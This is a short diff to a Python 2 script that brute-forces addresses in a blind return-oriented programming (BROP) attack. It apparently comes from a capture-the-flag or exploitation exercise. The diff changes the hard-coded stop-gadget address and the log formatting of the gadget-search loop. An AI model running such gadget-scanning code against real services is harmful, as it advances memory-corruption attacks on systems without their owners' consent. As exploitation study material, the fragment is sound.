@@ -31,7 +31,7 @@ def check_brop_gadget(length,addr):
         return True
 
 length = 72
-stop_gadget = 0x4006d5
+stop_gadget = 0x4005c0
 addr = 0x400750
 f = open('brop.txt','w')
 while 1:
@@ -40,7 +40,7 @@ while 1:
         print "possible stop_gadget :0x%x"%addr
         if check_brop_gadget(length,addr):
             print "success brop gadget:0x%x"%addr
-            f.write("success brop gadget :0x%x"%addr)
+            f.write("success brop gadget :0x%x"%addr + "\n")
             break
     addr += 1
 
